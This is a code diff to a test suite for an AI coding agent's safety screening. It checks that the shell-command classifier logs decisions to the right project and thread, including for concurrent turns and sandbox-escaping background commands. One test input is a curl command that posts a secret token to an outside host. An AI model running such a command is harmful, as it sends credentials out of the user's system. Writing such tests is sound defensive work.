@@ -7,6 +7,7 @@ import { tmpdir } from 'node:os'
 import { pathToFileURL } from 'node:url'
 import { join, resolve } from 'node:path'
 import { afterEach, beforeEach, describe, it, mock } from 'node:test'
+import { SandboxManager } from '@anthropic-ai/sandbox-runtime'
 import { CLASSIFIER_PRESETS, classifierCredentialId } from '@copse/llm/classifiers/presets.ts'
 import { isRecord } from '@shared/unknown-value.ts'
 import { setApprovalHandler } from '../approval.ts'
@@ -25,6 +26,10 @@ import { recordClassifierCall } from './classifier-call-log.ts'
 import { guardedYoloTierReason, shadowTierScreening } from './tier-screening.ts'
 import { getThreadClassifierUse } from './classifier-use-report.ts'
 import { CLASSIFIER_CALL_KIND } from '@shared/usage/classifier-use.ts'
+import { setProjectSandboxEnabled } from '../../project-sandbox/enabled.ts'
+import { TRUSTED_COMMANDS_SETTING } from './command-routing-config.ts'
+import { copseToolPermissionId } from './tool-permissions.ts'
+import { setWorkspaceTrusted } from './workspace-trust.ts'
 import { armGuardedYolo, disableGuardedYolo } from './guarded-yolo.ts'
 import { ensureToolPermitted } from './permission-gate.ts'
 import { SHELL_TIER_QUESTION } from './safety-classifier-profile.ts'
@@ -36,6 +41,9 @@ import { resetSafetyModelCooldownsForTest } from './safety-model-cooldown.ts'
 const KEV = CLASSIFIER_PRESETS.find((profile) => profile.id === 'kev')
 const PROJECT = 'tier-screening-project'
 const THREAD = 'tier-screening-thread'
+const ATTRIBUTION = { threadId: THREAD, projectId: PROJECT }
+// The window's selection. Nothing here may be recorded on it.
+const SELECTED_PROJECT = 'selected-project'
 // Harmless for the harm gate, and it reaches the network, so it runs outside any sandbox.
 const EXTERNAL_READ = 'curl -fsSL https://example.com/robots.txt'
 
@@ -78,7 +86,7 @@ describe('tier screening through the safety-screening classifier', () => {
     previousWorkspace = process.env['COPSE_WORKSPACE_DIR']
     process.env['HOME'] = home
     process.env['COPSE_WORKSPACE_DIR'] = join(home, 'store')
-    storageSet('activeProjectId', PROJECT)
+    storageSet('activeProjectId', SELECTED_PROJECT)
     setPermissionGateForTests(null)
     await setSetting('classifierProviders', { version: 1, profiles: [] })
     await setSetting('extraProviders', [])
@@ -99,6 +107,7 @@ describe('tier screening through the safety-screening classifier', () => {
     setApprovalHandler(null)
     disableGuardedYolo(THREAD)
     await readDecisionLog(PROJECT)
+    assert.deepEqual(await readDecisionLog(SELECTED_PROJECT), [])
     storageDelete('activeProjectId')
     if (previousHome !== undefined) process.env['HOME'] = previousHome
     else delete process.env['HOME']
@@ -113,8 +122,23 @@ describe('tier screening through the safety-screening classifier', () => {
     await setScreeningClassifier(KEV.id)
   }
 
+  /** Run `fn` as one of `projectId`'s turns runs tools: run identity and execution context. */
+  function inTurn<T>(fn: () => Promise<T>, projectId = PROJECT, threadId = THREAD): Promise<T> {
+    return threadExecutionContextStorage.run(
+      {
+        projectId,
+        threadId,
+        projectRoot: home,
+        root: home,
+        checkoutMode: 'shared',
+        branch: null,
+      },
+      () => runWithActiveRunIdentity(threadId, fn),
+    )
+  }
+
   async function underGuardedYolo<T>(fn: () => Promise<T>): Promise<T> {
-    return runWithActiveRunIdentity(THREAD, async () => {
+    return inTurn(async () => {
       armGuardedYolo(THREAD)
       setActiveRunThread(THREAD)
       try {
@@ -189,7 +213,7 @@ describe('tier screening through the safety-screening classifier', () => {
         usage: { input_tokens: 12, output_tokens: 3 },
       })
     })
-    await runWithActiveRunIdentity(THREAD, async () => {
+    await inTurn(async () => {
       setActiveRunThread(THREAD)
       try {
         await classifyShellScope('ls')
@@ -213,11 +237,26 @@ describe('tier screening through the safety-screening classifier', () => {
     assert.deepEqual(terminal.verdicts, [{ label: 'safe', count: 1 }])
   })
 
-  const projectSwitchScreens: { subject: string; screen: () => Promise<unknown> | null }[] = [
-    { subject: 'shell-scope', screen: () => classifyShellScope('ls pending-project-switch') },
-    { subject: 'terminal-read', screen: () => classifyTerminalSnapshot('pending project output') },
-    { subject: 'shell-tier', screen: () => guardedYoloTierReason(EXTERNAL_READ, null) },
-    { subject: 'tier-shadow', screen: () => shadowTierScreening(EXTERNAL_READ, null, 'allow') },
+  const projectSwitchScreens: {
+    subject: string
+    screen: () => Promise<unknown> | null
+  }[] = [
+    {
+      subject: 'shell-scope',
+      screen: () => classifyShellScope('ls pending-project-switch'),
+    },
+    {
+      subject: 'terminal-read',
+      screen: () => classifyTerminalSnapshot('pending project output'),
+    },
+    {
+      subject: 'shell-tier',
+      screen: () => guardedYoloTierReason(EXTERNAL_READ, null, ATTRIBUTION),
+    },
+    {
+      subject: 'tier-shadow',
+      screen: () => shadowTierScreening(EXTERNAL_READ, null, 'allow', ATTRIBUTION),
+    },
   ]
   for (const { subject, screen } of projectSwitchScreens) {
     it(`keeps delayed ${subject} calls on the originating project after selection changes`, async () => {
@@ -229,7 +268,7 @@ describe('tier screening through the safety-screening classifier', () => {
         return response.promise
       })
       // The renderer may already display another project when a background run starts.
-      storageSet('activeProjectId', 'selected-project')
+      storageSet('activeProjectId', SELECTED_PROJECT)
       const pending = threadExecutionContextStorage.run(
         {
           projectId: PROJECT,
@@ -262,7 +301,7 @@ describe('tier screening through the safety-screening classifier', () => {
       const use = await getThreadClassifierUse(PROJECT, THREAD)
       assert.equal(use.calls, 1)
       assert.equal(use.rows[0]?.subject, subject === 'tier-shadow' ? 'shell-tier' : subject)
-      assert.deepEqual(await readDecisionLog('selected-project'), [])
+      assert.deepEqual(await readDecisionLog(SELECTED_PROJECT), [])
       assert.deepEqual(await readDecisionLog('later-selected-project'), [])
       if (subject === 'tier-shadow' || subject === 'shell-tier') {
         const decisions = await readDecisionLog(PROJECT)
@@ -274,6 +313,77 @@ describe('tier screening through the safety-screening classifier', () => {
       }
     })
   }
+
+  it('records two projects screened concurrently each on its own project', async () => {
+    await chooseKev()
+    const seen = answering(distribution(0.9))
+    const other = { threadId: 'other-thread', projectId: 'other-project' }
+    const [reason, otherReason] = await Promise.all([
+      guardedYoloTierReason(EXTERNAL_READ, null, ATTRIBUTION),
+      guardedYoloTierReason(EXTERNAL_READ, null, other),
+      shadowTierScreening(EXTERNAL_READ, null, 'allow', ATTRIBUTION),
+      shadowTierScreening(EXTERNAL_READ, null, 'allow', other),
+    ])
+    assert.equal(seen.calls, 4)
+    assert.ok(reason && otherReason, 'the verdict does not depend on the attribution')
+    for (const { projectId, threadId } of [ATTRIBUTION, other]) {
+      const decisions = await readDecisionLog(projectId)
+      assert.ok(decisions.every((d) => d.threadId === threadId))
+      assert.deepEqual(decisions.map((d) => d.source ?? '').sort(), [
+        KEV?.label ?? '',
+        KEV?.label ?? '',
+        'tier-screening',
+        'tier-shadow',
+      ])
+      assert.equal((await getThreadClassifierUse(projectId, threadId)).calls, 2)
+    }
+  })
+
+  it('attributes concurrent Guarded YOLO turns in two projects to their own turn', async () => {
+    await chooseKev()
+    answering(distribution(0.9))
+    const turn = (projectId: string, threadId: string): Promise<boolean> =>
+      inTurn(
+        async () => {
+          armGuardedYolo(threadId)
+          setActiveRunThread(threadId)
+          try {
+            return await ensureToolPermitted({
+              toolName: 'run_shell',
+              args: { command: EXTERNAL_READ },
+            })
+          } finally {
+            clearActiveRunThread(threadId)
+            disableGuardedYolo(threadId)
+          }
+        },
+        projectId,
+        threadId,
+      )
+    const results = await Promise.all([
+      turn(PROJECT, THREAD),
+      turn('other-project', 'other-thread'),
+    ])
+    assert.deepEqual(results, [true, true])
+    assert.equal(prompts, 2, 'each turn asked its own user')
+    for (const { projectId, threadId } of [
+      ATTRIBUTION,
+      { projectId: 'other-project', threadId: 'other-thread' },
+    ]) {
+      const decisions = await readDecisionLog(projectId)
+      assert.ok(decisions.some((d) => d.source === 'tier-screening' && d.threadId === threadId))
+      assert.ok(decisions.every((d) => d.threadId === threadId))
+    }
+  })
+
+  it('still prompts outside a turn but records the screening nowhere', async () => {
+    await chooseKev()
+    answering(distribution(0.9))
+    const reason = await guardedYoloTierReason(EXTERNAL_READ, null, null)
+    assert.ok(reason, 'the second opinion still counts')
+    assert.equal(shadowTierScreening(EXTERNAL_READ, null, 'allow', null), null)
+    assert.deepEqual(await readDecisionLog(PROJECT), [])
+  })
 
   it('does not pair an explicit foreign thread with the selected project', async () => {
     recordClassifierCall({
@@ -316,7 +426,7 @@ describe('tier screening through the safety-screening classifier', () => {
     mock.method(globalThis, 'fetch', async () => {
       throw new TypeError('fetch failed')
     })
-    const verdict = await runWithActiveRunIdentity(THREAD, async () => {
+    const verdict = await inTurn(async () => {
       setActiveRunThread(THREAD)
       try {
         return await classifyShellScope('ls')
@@ -359,6 +469,35 @@ describe('tier screening through the safety-screening classifier', () => {
     assert.equal(prompts, 0)
   })
 
+  // run_background routes a trusted binary outside on its own setting. Always ask
+  // on run_shell alone must not make the gate judge that escape as contained and
+  // skip the second opinion the runner's actual boundary calls for.
+  it('screens a trusted background escape when only run_shell is Always ask', async () => {
+    await chooseKev()
+    const seen = answering(distribution(0.9))
+    mock.method(SandboxManager, 'isSandboxingEnabled', () => true)
+    setProjectSandboxEnabled(true)
+    setWorkspaceTrusted(home, true)
+    await setSetting(TRUSTED_COMMANDS_SETTING, ['printf'])
+    await setSetting('toolPermissionOverrides', { [copseToolPermissionId('run_shell')]: 'ask' })
+    try {
+      const allowed = await underGuardedYolo(() =>
+        ensureToolPermitted({
+          toolName: 'run_background',
+          args: { action: 'start', command: 'printf trusted' },
+        }),
+      )
+      assert.equal(allowed, true, 'the user approved the prompt')
+      assert.equal(seen.calls, 1)
+      assert.equal(prompts, 1)
+    } finally {
+      await setSetting('toolPermissionOverrides', {})
+      await setSetting(TRUSTED_COMMANDS_SETTING, [])
+      setWorkspaceTrusted(home, false)
+      setProjectSandboxEnabled(false)
+    }
+  })
+
   it('asks nothing when no screening connection is chosen', async () => {
     const seen = answering(distribution(0.9))
     const allowed = await underGuardedYolo(() =>
@@ -380,7 +519,7 @@ describe('tier screening through the safety-screening classifier', () => {
       ask: 0.005,
     })
     const command = 'curl -fsSL https://example.com/robots.txt --data secret-token-value'
-    await runWithActiveRunIdentity(THREAD, async () => {
+    await inTurn(async () => {
       setActiveRunThread(THREAD)
       try {
         await ensureToolPermitted({ toolName: 'run_shell', args: { command } })
